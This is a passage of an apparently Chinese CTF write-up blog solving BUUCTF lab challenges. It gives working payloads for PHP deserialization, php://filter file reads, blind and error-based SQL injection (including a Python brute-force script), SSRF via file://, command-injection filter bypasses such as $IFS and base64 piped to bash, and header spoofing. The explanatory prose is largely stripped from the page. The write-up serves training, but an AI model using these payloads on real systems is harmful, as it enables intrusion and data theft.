class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>($file);  <span class=\"comment\">//useless.php</span></span><br><span class=\"line\">        $password = unserialize($password);  <span class=\"comment\">//</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p></p>\n<p>textwelcome to the zjctfdata</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</span><br><span class=\"line\">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>\n<p>fileuseless.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Flag</span></span>&#123;  <span class=\"comment\">//flag.php  </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span></span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;file))&#123;  </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;file); </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">\"U R SO CLOSE !///COME ON PLZ\"</span>);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>password</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;5bfc7735-e6c3-4e4b-9612-573138d921bd.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>flag</p>\n<h2 id=\"-2018-Fakebook\"><a href=\"#-2018-Fakebook\" class=\"headerlink\" title=\"[ 2018]Fakebook\"></a>[ 2018]Fakebook</h2><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;user.php.bak</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $blog = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($name, $age, $blog)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;name = $name;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age = (int)$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;blog = $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;\t<span class=\"comment\">//curl</span></span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\">       <span class=\"comment\">//url</span></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"comment\">//url</span></span><br><span class=\"line\">        $output = curl_exec($ch);</span><br><span class=\"line\">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($httpCode == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">404</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      <span class=\"comment\">//curl</span></span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//curl_init()</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getBlogContents</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get(<span class=\"keyword\">$this</span>-&gt;blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValidBlog</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $blog = <span class=\"keyword\">$this</span>-&gt;blog;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> preg_match(<span class=\"string\">\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\"</span>, $blog);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p></p>\n<p>view.phpno</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">dic =<span class=\"string\">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class=\"line\">url = <span class=\"string\">\"\"</span></span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">        payload = <span class=\"string\">\"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)\"</span>.format(i,j);</span><br><span class=\"line\">        r = requests.get(url=payload)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"Fatal\"</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">            print(payload)</span><br><span class=\"line\">            flag += str(chr(j))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    print(flag)</span><br><span class=\"line\">payload = <span class=\"string\">\"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)\"</span>.format(i,j);</span><br><span class=\"line\"><span class=\"comment\">#users</span></span><br><span class=\"line\">payload = <span class=\"string\">'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=\"users\"),&#123;&#125;,1))=&#123;&#125;,2,3)'</span>.format(i,j);</span><br><span class=\"line\"><span class=\"comment\">#no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span></span><br><span class=\"line\">payload = <span class=\"string\">'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(data) from users),&#123;&#125;,1))=&#123;&#125;,2,3)'</span>.format(i,j);</span><br><span class=\"line\"><span class=\"comment\">#O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:11;s:4:\"blog\";s:8:\"pz1o.top\";&#125;</span></span><br></pre></td></tr></table></figure>\n<p>0x7ebantcl</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1%20and%20extractvalue(1,concat(%27$%27,(<span class=\"keyword\">select</span>(<span class=\"keyword\">group_concat</span>(<span class=\"keyword\">database</span>()))))%<span class=\"number\">23</span></span><br><span class=\"line\">fakebook</span><br><span class=\"line\"><span class=\"number\">1</span>%<span class=\"number\">20</span><span class=\"keyword\">and</span>%<span class=\"number\">20</span>extractvalue(<span class=\"number\">1</span>,<span class=\"keyword\">concat</span>(%<span class=\"number\">27</span>$%<span class=\"number\">27</span>,(<span class=\"keyword\">select</span><span class=\"comment\">/**/</span><span class=\"keyword\">group_concat</span>(table_name)<span class=\"comment\">/**/</span><span class=\"keyword\">from</span><span class=\"comment\">/**/</span>information_schema.tables<span class=\"comment\">/**/</span><span class=\"keyword\">where</span><span class=\"comment\">/**/</span>table_schema=<span class=\"keyword\">database</span>())))%<span class=\"number\">23</span></span><br><span class=\"line\"><span class=\"keyword\">users</span></span><br><span class=\"line\"><span class=\"number\">1</span>%<span class=\"number\">20</span><span class=\"keyword\">and</span>%<span class=\"number\">20</span>extractvalue(<span class=\"number\">1</span>,<span class=\"keyword\">concat</span>(%<span class=\"number\">27</span>$%<span class=\"number\">27</span>,(<span class=\"keyword\">select</span>%<span class=\"number\">20</span><span class=\"keyword\">group_concat</span>(column_name)%<span class=\"number\">20</span><span class=\"keyword\">from</span>%<span class=\"number\">20</span>information_schema.columns%<span class=\"number\">20</span><span class=\"keyword\">where</span>%<span class=\"number\">20</span>table_name=%<span class=\"number\">27</span><span class=\"keyword\">users</span>%<span class=\"number\">27</span>)))%<span class=\"number\">23</span></span><br><span class=\"line\"><span class=\"keyword\">no</span>,username,passwd,<span class=\"keyword\">data</span>,<span class=\"keyword\">USER</span>,CU</span><br><span class=\"line\"><span class=\"number\">1</span>%<span class=\"number\">20</span><span class=\"keyword\">and</span> extractvalue(%<span class=\"number\">27</span>$%<span class=\"number\">27</span>,<span class=\"keyword\">concat</span>(%<span class=\"number\">27</span>$%<span class=\"number\">27</span>,(<span class=\"keyword\">select</span> <span class=\"keyword\">data</span>%<span class=\"number\">20</span><span class=\"keyword\">from</span>%<span class=\"number\">20</span><span class=\"keyword\">users</span>)))%<span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n<p>wpno</p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0%20union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;%27%23</span><br></pre></td></tr></table></figure>\n<p>datablogblogflag</p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h2 id=\"GXYCTF2019-Ping-Ping-Ping\"><a href=\"#GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"[GXYCTF2019]Ping Ping Ping\"></a>[GXYCTF2019]Ping Ping Ping</h2><p>ping</p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ip&#x3D;8.8.8.8;ls</span><br></pre></td></tr></table></figure>\n<p>flag.phpflag.php</p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200831111916451.png\" alt=\"image-20200831111916451\"></p>\n<p><strong></strong>${IFS}</p>\n<ol>\n<li><p>```<br>root@kali:~# cat flag<br>this is your flag<br>root@kali:~# cat${IFS}flag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">2.</span><br></pre></td></tr></table></figure>\n<p>root@kali:~# cat${IFS}$1flag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">3.</span><br></pre></td></tr></table></figure>\n<p>root@kali:~# cat$IFS$1flag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">1.</span><br></pre></td></tr></table></figure>\n<p>root@kali:~# cat&lt;&gt;flag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">2.</span><br></pre></td></tr></table></figure>\n<p>root@kali:~# cat&lt;flag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$&#123;IFS&#125;&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20200831164017570](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200831164017570.png)</span><br><span class=\"line\"></span><br><span class=\"line\">flag****</span><br><span class=\"line\"></span><br><span class=\"line\">1. </span><br></pre></td></tr></table></figure>\n<p>root@kali:~# a=c;b=at;c=fl;d=ag;$a$b $c$d<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">2. base64</span><br></pre></td></tr></table></figure>\n<p>root@kali:~# <code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code><br>this is your flag</p>\n<p>root@kali:~# echo Y2F0IGZsYWc=|base64 -d|bash<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">3. </span><br></pre></td></tr></table></figure>\n<p>root@kali:~# cat flag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">4. </span><br></pre></td></tr></table></figure>\n<p>root@kali:~# c\\at fl\\ag<br>this is your flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>?ip=8.8.8.8;a=g;cat$IFS$1fla$a.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">flag</span><br><span class=\"line\"></span><br><span class=\"line\">****</span><br><span class=\"line\"></span><br><span class=\"line\">## [RoarCTF 2019]Easy Calcphp</span><br><span class=\"line\"></span><br><span class=\"line\">calc.php calc.php</span><br><span class=\"line\"></span><br><span class=\"line\">![image-20200901155413352](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200901155413352.png)</span><br><span class=\"line\"></span><br><span class=\"line\">num403waf</span><br><span class=\"line\"></span><br><span class=\"line\">**php**</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; PHP</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; 1. </span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; 2.wafphp</span><br><span class=\"line\"></span><br><span class=\"line\">phpinfo();</span><br><span class=\"line\"></span><br><span class=\"line\">flagphpinfoban</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">1. **scandir() **:</span><br><span class=\"line\">   </span><br><span class=\"line\"></span><br><span class=\"line\">2. **base_convert(number,formbase,tobase) **:</span><br><span class=\"line\"></span><br><span class=\"line\">   </span><br><span class=\"line\"></span><br><span class=\"line\">3. **dechex() **</span><br><span class=\"line\"></span><br><span class=\"line\">   </span><br><span class=\"line\"></span><br><span class=\"line\">4. **hex2bin() **</span><br><span class=\"line\"></span><br><span class=\"line\">    ASCII </span><br><span class=\"line\"></span><br><span class=\"line\">5. **readfile() **:</span><br><span class=\"line\"></span><br><span class=\"line\">   </span><br><span class=\"line\"></span><br><span class=\"line\">6. **chr()**</span><br><span class=\"line\"></span><br><span class=\"line\">   ascii</span><br><span class=\"line\"></span><br><span class=\"line\">7. **ord()**</span><br><span class=\"line\"></span><br><span class=\"line\">   ascii</span><br><span class=\"line\"></span><br><span class=\"line\">8. **file_get_contents()**</span><br><span class=\"line\"></span><br><span class=\"line\">   </span><br><span class=\"line\"></span><br><span class=\"line\">hex2bin(dechex(47))&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">payload</span><br></pre></td></tr></table></figure>\n<p>? num=var_dump(scandir(chr(47)))<br>? num=var_dump(scandir(hex2bin(dechex(47))))</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">flagreadfile</span><br></pre></td></tr></table></figure>\n<p>? num=var_dump(readfile(chr(47).f1agg))<br>? num=file_get_contents(chr(47).f1agg)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">payload</span><br></pre></td></tr></table></figure>\n<p>? num=base_convert(55490343972,10,36)()</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## [ACTF2020 ]Exec</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>8.8.8.8;ls /<br>8.8.8.8;cat /flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## [ 2019]Http</span><br><span class=\"line\"></span><br><span class=\"line\">xffuaref</span><br></pre></td></tr></table></figure>\n<p>GET /Secret.php HTTP/1.1<br>Host: node3.buuoj.cn:28918<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 Syclover<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>referer: <a href=\"https://www.Sycsecret.com\" target=\"_blank\" rel=\"noopener\">https://www.Sycsecret.com</a><br>X-Forwarded-for: 127.0.0.1</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"># </span><br><span class=\"line\"></span><br><span class=\"line\">## [SUCTF 2019]CheckIn.user.ini</span><br><span class=\"line\"></span><br><span class=\"line\">&#96;&#96;&#96;php</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class=\"line\">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;Upload Labs&lt;&#x2F;title&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;h2&gt;Upload Labs&lt;&#x2F;h2&gt;</span><br><span class=\"line\">    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class=\"line\">        &lt;label 